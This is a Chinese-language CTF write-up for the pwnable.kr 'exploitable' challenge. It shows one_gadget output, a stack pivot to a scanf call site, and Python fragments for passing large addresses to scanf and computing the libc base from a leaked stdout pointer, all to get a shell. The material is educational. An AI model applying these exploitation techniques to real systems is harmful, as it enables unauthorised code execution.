# pwnable.kr "exploitable" writeup

这道题和 bctf2017的 babyuse 利用方法一样，都是能跳转到任意地址，但是参数不可控。这时候就要用m4gic system ROP了，跳转到 libc 里面的do_system函数中间的地址。用 one_gadget 来寻找可以跳转的 gadget。

但是直接跳转的话会发现所有的 gadget 都不可用

```shell
➜  exploitable one_gadget libc.so.6
0x3a7f9	execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the address of `rw-p` area of libc
  [esp+0x34] == NULL

0x5ef45	execl("/bin/sh", eax)
constraints:
  esi is the address of `rw-p` area of libc
  eax == NULL

0x5ef46	execl("/bin/sh", [esp])
constraints:
  esi is the address of `rw-p` area of libc
  [esp] == NULL
```

调试发现是不满足 gadget 的 constraints， 于是考虑先跳转到之前的某个位置，迁移一下栈

```assembly
.text:08048567                 lea     eax, [ebp-10h] //跳转到此处
.text:0804856A                 push    eax
.text:0804856B                 push    offset format_string
.text:08048570                 call    ___isoc99_scanf
.text:08048575                 add     esp, 10h
.text:08048578                 mov     eax, [ebp-10h]
.text:0804857B                 sub     esp, 0Ch
.text:0804857E                 push    0DEADBEEFh
.text:08048583                 call    eax
```

迁移栈后 用上面的第一个 gadget，就能成功 getshell 了。但是调试的时候发现跳转到 gadget 起始地址的时候，并没有满足 constraints， [esp+0x34]不是 NULL，但是[esp+0x38]是 NULL，但是尽管如此，还是能够正确执行，所以第0个参数是什么是无关紧要的，按道理应该是execve 执行的程序的程序名，但是改成其他的也不影响程序的执行。但是第一个参数不是 NULL 的话就会出错。

```
➜  test ./a.out
aaaaaaaaaaaaaaaaaaaaaqwerasdfsadfsadfsadfasd/bin/sh@#(*@#&((&))): 0: Can't open asdf
```

所以这应该是 one_gadget 一个小小的不足。



# 坑点

1. 如果要跳转到 libc 里面，那么`scanf("%d", &eip)`的 eip 是大于0x7fffffff的值，这时候不能直接传一个正数进去，要转化成负数传进去，否则 scanf 由于溢出会把 eip 填0

   ```python
   if eip > 0x7fffffff:
       p.sendline("-" + str(2**32 - eip))
   else:
       p.sendline(str(eip))
   ```

2. 程序会打印 stdout 的地址，但是根据这个地址计算 libc 的基地址的时候不能这样写

   ```python
   libc.address = _stdout - libc.symbols['stdout']
   ```

   而应该这样写

   ```python
   libc.address = _stdout - libc.symbols['_IO_2_1_stdout_']
   ```

   因为 gdb 调试的时候发现实际的符号名并不是 `stdout`，而是`_IO_2_1_stdout_ `。至于 stdout 这个符号到底是啥，并不知道。

   ​